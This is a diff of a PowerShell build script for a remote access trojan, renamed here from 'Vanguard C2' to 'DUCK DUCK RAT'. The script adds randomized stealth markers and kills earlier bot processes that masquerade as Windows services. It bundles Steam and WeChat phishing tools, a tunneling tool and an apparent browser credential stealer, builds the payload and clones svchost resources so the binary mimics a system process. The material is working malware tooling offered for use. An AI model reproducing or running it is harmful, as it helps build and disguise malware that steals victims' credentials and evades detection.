@@ -1,4 +1,4 @@
-# Vanguard C2: Ultra-Optimized Monolithic Rebuild Script (V7.4)
+# DUCK DUCK RAT v1: Ultra-Optimized Rebuild Script (V8.0)
 $ErrorActionPreference = "Stop"
 
 Write-Host "================================================" -ForegroundColor Cyan
@@ -38,7 +38,7 @@ Write-Host "[*] Phase 0.1: Randomizing IPC and Stealth Toggles..." -ForegroundCo
 $content = $content -replace 'DEBUG_MODE = true', 'DEBUG_MODE = false'
 
 # 2. Randomize IPC markers
-$RandIPC = "EmoCore_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
+$RandIPC = "DuckDuckRat_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
 $content = $content -replace 'IPC_EVENT_BASE = ".*?"', "IPC_EVENT_BASE = `"$RandIPC`""
 
 # 3. Randomize AppData subdirectory (Core)
@@ -65,9 +65,40 @@ $content = $content -replace 'VERSION = ".*?"', "VERSION = `"$RandVer`""
 Set-Content $constantsPath $content
 
 Write-Host "[*] Phase 0.5: Nuclear Cleanup & Tool Preparation..." -ForegroundColor Yellow
-Get-Process "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force
-Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
-Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
+$BadProcesses = @("svhost", "MicrosoftManagementSvc", "FinalBot", "EmoCore", "SteamLogin", "SteamAlert", "bore", "chromelevator")
+foreach ($proc in $BadProcesses) {
+    Get-Process $proc -ErrorAction SilentlyContinue | Stop-Process -Force
+}
+# Cleanup old artifacts to prevent 16-bit app errors (file locks)
+$WorkDir = "$env:APPDATA\Microsoft\Windows\Network"
+if (Test-Path $WorkDir) {
+    Write-Host "[*] Purging resource cache in $WorkDir..." -ForegroundColor Gray
+    Get-ChildItem $WorkDir -File | Remove-Item -Force -ErrorAction SilentlyContinue 
+}
+
+# --- Enhanced Nuclear Cleanup ---
+Write-Host "[*] Phase 0.55: Purging workspace junk (Safe Cleanup)..." -ForegroundColor Yellow
+
+# Delete hex-named symlinks/directories from ROOT only (ignoring .git)
+$HexDirs = Get-ChildItem -Path . -Directory | Where-Object { $_.Name -match "^[0-9a-f]{2}$" }
+foreach ($hDir in $HexDirs) {
+    Remove-Item $hDir.FullName -Recurse -Force -ErrorAction SilentlyContinue 
+}
+
+# Delete all identifiable junk logs in the root
+$JunkFiles = @(
+    "build_error.log", "build_log.txt", "full_build.log", "copy.log", "copy2.log", "copy3.log",
+    "error.log", "error_final.log", "error_restored.log", "error_restored2.log", "error_restored3.log",
+    "error_restored4.log", "error_restored5.log", "error_restored6.log", "error_restored7.log", "error_restored8.log",
+    "build.log", "build_utf8.log", "svc_debug.log", "svhost.bin"
+)
+foreach ($file in $JunkFiles) {
+    if (Test-Path $file) { Remove-Item $file -Force -ErrorAction SilentlyContinue }
+}
+
+Remove-Item "dist", "scripts\publish", "tools\publish" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue
+
 if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }
 
 # 1. Restore e_sqlite3.dll from NuGet cache if missing in root
@@ -173,6 +204,7 @@ if (!(Test-Path "svhost.bin")) {
 $OtherResources = @(
     @{ Src = "tools\SteamAlert.exe";   Dest = "SteamAlert.bin" },
     @{ Src = "tools\SteamLogin.exe";   Dest = "SteamLogin.bin" },
+    @{ Src = "tools\WeChatPhish.exe";  Dest = "WeChatPhish.bin" },
     @{ Src = "tools\bore.exe";         Dest = "bore.bin" },
     @{ Src = "tools\chromelevator.exe";Dest = "chromelevator.bin" },
     @{ Src = "Modules\WeChat.exe";     Dest = "WeChatPhish.bin" }
@@ -184,11 +216,11 @@ foreach ($res in $OtherResources) {
     }
 }
 
-Write-Host "[*] Phase 5: Final Monolithic AOT Build..." -ForegroundColor Cyan
-dotnet publish FinalBot.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
+Write-Host "[*] Phase 5: Final Monolithic AOT Build (DuckDuckRat)..." -ForegroundColor Cyan
+dotnet publish DuckDuckRat.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
 if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }
 
-$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\MicrosoftManagementSvc.exe"
+$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\DuckDuckRat.exe"
 
 Write-Host "[*] Phase 6: Resource Mimicry (svchost cloning)..." -ForegroundColor Cyan
 dotnet publish tools\ResourceCloner.csproj -c Release -r win-x64 --self-contained true -o tools\publish --nologo
@@ -207,4 +239,4 @@ $Size = (Get-Item $FinalExe).Length / 1MB
 Write-Host "[+] Final Size: $('{0:N2}' -f $Size) MB" -ForegroundColor Yellow
 
 # Final Cleanup
-Remove-Item dist, scripts\publish, defense\Constants.cs, Persistence.cs, defense\persist.cs -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item dist, scripts\publish, Core\Constants.cs.bak, Persistence.cs, defense\persist.cs -Recurse -Force -ErrorAction SilentlyContinue
